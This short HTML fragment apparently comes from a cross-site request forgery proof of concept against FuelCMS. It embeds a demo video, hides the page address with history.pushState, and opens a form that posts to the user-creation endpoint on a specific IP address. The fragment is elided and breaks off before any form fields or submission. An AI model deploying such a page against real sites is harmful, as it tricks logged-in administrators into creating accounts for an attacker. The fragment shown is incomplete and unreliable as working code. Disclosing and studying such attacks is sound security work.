<iframe height=498 width=510 src="img/fuel.mp4" frameborder=0 allowfullscreen></iframe>
...
<html>
  ...
  <script>history.pushState('', '', '/')</script>
    <form action="http://123.207.153.65:8080/fuel/users/create/" method="POST" enctype="multipart/form-data">
